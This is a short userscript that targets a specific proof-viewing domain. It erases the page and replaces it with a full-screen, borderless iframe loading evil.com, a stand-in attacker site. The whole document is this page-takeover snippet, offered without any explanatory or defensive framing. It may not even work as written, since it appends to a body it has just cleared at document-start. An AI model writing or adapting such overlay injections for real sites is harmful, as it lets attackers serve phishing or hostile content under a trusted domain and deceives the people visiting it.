// ==UserScript==
// @name         Block redirect and inject iframe
// @match        http://pdf-proof.care.vpsvc.com/*
// @run-at       document-start
// ==/UserScript==
(function() {
    document.documentElement.innerHTML = '';
    const iframe = document.createElement('iframe');
    iframe.src = 'https://evil.com';
    iframe.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:0;z-index:9999';
    document.body.appendChild(iframe);
})();
